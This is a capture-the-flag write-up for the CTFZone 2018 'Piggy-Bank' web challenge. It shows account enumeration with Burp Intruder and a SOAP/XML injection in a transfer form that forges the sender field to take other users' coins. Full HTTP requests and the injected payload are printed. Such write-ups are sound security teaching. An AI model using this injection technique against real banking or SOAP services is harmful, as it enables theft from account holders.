CTFZone Quals 2018 - Piggy-Bank
-------------------------
**Category:** Web
**Points:** 500 (Dynamic scoring)

##### Description:
```
Hack some bank for me.
http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/
```
##### Useful Resources:
+ https://resources.infosecinstitute.com/soap-attack-2/
+ https://riseandhack.blogspot.com/2015/02/xml-injection-soap-injection-notes.html


First, visiting the site we can see that the website is some type of bank, also we see “Sign-In” and "Sign-Up" pages, so we can make an account and login.

There are then 5 main pages: Profile, Menu, Transfer, VIP and For Developers:
+ Profile - Lists your full name, bank ID and bank balance
+ Menu - “Welcome to Piggy-Bank! Here you can store your coins and at any time break the piggy-bank and pull them out! Please do not break the laws and do not try to hack us, be a nice pig.”
+ Transfer - Simple form to transfer money between bank accounts, asks for a BankID and amount
+ VIP - This section is available only to privileged pigs with money in pockets. Transfer to the piggy-bank 1 000 000 coins and become important.          
+ For Developers - Especially for pig-developers, we have the coolest api, which they will soon be able to use!
    - But in the source we can see the comment <!-- Link to the API (http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php) (Testing stage) -->
   
After going through the pages, we can assume we have to get 1,000,000 coins to become VIP by exploiting a bug in the site that most likely has something to do with the API.

When visiting the API link (http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php) we're prompted with an XML file of the functions of the site.
```
<?xml version="1.0" encoding="utf-8"?><wsdl:definitions name="Bank"
             targetNamespace="urn:Bank"
             xmlns:tns="urn:Bank"
             xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
             xmlns:xsd="http://www.w3.org/2001/XMLSchema"
             xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
             xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
             xmlns="http://schemas.xmlsoap.org/wsdl/">

    <message name="BalanceRequest">
        <part name="wallet_num" type="xsd:decimal"/>
    </message>

    <message name="BalanceResponse">
        <part name="code" type="xsd:float"/>
        <part name="status" type="xsd:string"/>
    </message>

    <message name="internalTransferRequest">
        <part name="receiver_wallet_num" type="xsd:decimal"/>
        <part name="sender_wallet_num" type="xsd:decimal"/>
        <part name="amount" type="xsd:float"/>
        <part name="token" type="xsd:string"/>
    </message>

    <message name="internalTransferResponse">
        <part name="code" type="xsd:float"/>
        <part name="status" type="xsd:string"/>
    </message>

    <portType name="BankServicePort">
        <operation name="requestBalance">
            <input message="tns:BalanceRequest"/>
            <output message="tns:BalanceResponse"/>
        </operation>
        <operation name="internalTransfer">
            <input message="tns:internalTransferRequest"/>
            <output message="tns:internalTransferResponse"/>
        </operation>
    </portType>

    <binding name="BankServiceBinding" type="tns:BankServicePort">
        <soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
        <operation name="requestBalance">
            <soap:operation soapAction="urn:requestBalanceAction"/>
            <input>
                <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
            </input>
            <output>
                <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
            </output>
        </operation>
        <operation name="internalTransfer">
            <soap:operation soapAction="urn:internalTransferAction"/>
            <input>
                <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
            </input>
            <output>
                <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
            </output>
        </operation>
    </binding>

    <wsdl:service name="BankService">
        <wsdl:port name="BankServicePort" binding="tns:BankServiceBinding">
            <soap:address location="http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php" />
        </wsdl:port>
    </wsdl:service>
</wsdl:definitions>
```

At first I noticed ``<part name="amount" type="xsd:float"/>`` was a float and assumed that the bank wasn't handling floats correctly (E.g. NaN and Infinite floats), but using NaN just resets ours and the recipient's bank balance and using an infinite just prompts us saying we have insufficient funds.

So, I started learning about SOAP requests and common vulnerabilities, first I tried to get the ``requestBalance`` function working, after struggling for a while I finally got it working with the following request.

```
POST /api/bankservice.php HTTP/1.1
Host: web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-agent: parameth v1.0
Content-Length: 267
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope 
   xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
   <SOAP-ENV:Body>
   	<requestBalance>
   		<wallet_num>1440</wallet_num>
   	</requestBalance>
   </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

Response:
```
HTTP/1.1 200 OK
Date: Sun, 22 Jul 2018 02:14:42 GMT
Server: Apache/2.4.18 (Ubuntu)
Cache-Control: no-store, no-cache
Expires: Sun, 22 Jul 2018 02:14:42 +0000
Vary: Accept-Encoding
Content-Length: 547
Connection: close
Content-Type: text/xml; charset=utf-8

<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:Bank" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:requestBalanceResponse><code xsi:type="xsd:float">0</code><status xsi:type="xsd:string">0</status></ns1:requestBalanceResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
```

After this, I ran the request through Burp Intruder supplimenting the ``wallet_num`` to find wealthy accounts, I found several accounts that have over 1M+ in their accounts, so I assumed we had to steal from them somehow.

So, I tried to get the ``internalTransfer`` function working, however we need a token which I couldn't find (I wasted a lot of time on this), eventually after some more googling I came across some blog posts about SOAP Injection, it's essentially just injecting XML into the request, and because we already know the fields required from the wdsl document it makes it a lot easier to craft. 

The flow of the application would be something like this:
User submits a transfer request such as the following:
```
POST /home/transfer.php HTTP/1.1
Host: web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/home/transfer.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: PHPSESSID=90sftp3bs9qb0ri5cjb5bc7gq1
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

receiver=1380&amount=1
```
The server that translates ``receiver=1380&amount=1`` into the SOAP format which would be something like the following
```
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope 
   xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
   <SOAP-ENV:Body>
   	<internalTransfer>
   		<receiver_wallet_num>1380</receiver_wallet_num>
   		<sender_wallet_num>YOUR BANK ID</sender_wallet_num>
		<token>YOUR TRANSFER TOKEN</token>
   		<amount>1</amount>
   	</internalTransfer>
   </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```
Then this request is sent to the service binding (http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php)

However, the server wasn't validating the inputs correctly and allowed us to send letters and “</>” allowing us to inject our own SOAP values.

So the final request turned out to be:
```
POST /home/transfer.php HTTP/1.1
Host: web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/home/transfer.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Cookie: PHPSESSID=90sftp3bs9qb0ri5cjb5bc7gq1
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

receiver=2517.1</receiver_wallet_num><amount>1000000</amount><sender_wallet_num>1337</sender_wallet_num><receiver_wallet_num>2517.1&amount=10
```
Which will then be transformed into:
```
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope 
   xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
   <SOAP-ENV:Body>
   	<internalTransfer>
   		<receiver_wallet_num>2517.1</receiver_wallet_num>
   		<amount>1000000</amount>
   		<sender_wallet_num>1337</sender_wallet_num>
   		<receiver_wallet_num>2517.1</receiver_wallet_num>
        <sender_wallet_num>1337</sender_wallet_num>
   		<amount>10</amount>
   		<token>YOUR TOKEN</token>
   	</internalTransfer>
   </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```
And because the application is interpreting the first values, it allows us to steal other people's money by replacing the ``sender_wallet_num`` with their BankID.

After abusing this to steal 1,000,000 coins, we can access the VIP page which contains the flag.
``You are pig-Hacker! How you stole money?!?!! Flag: ctfzone{dcaa1f2047501ac0f4ae6f448082e63e}``
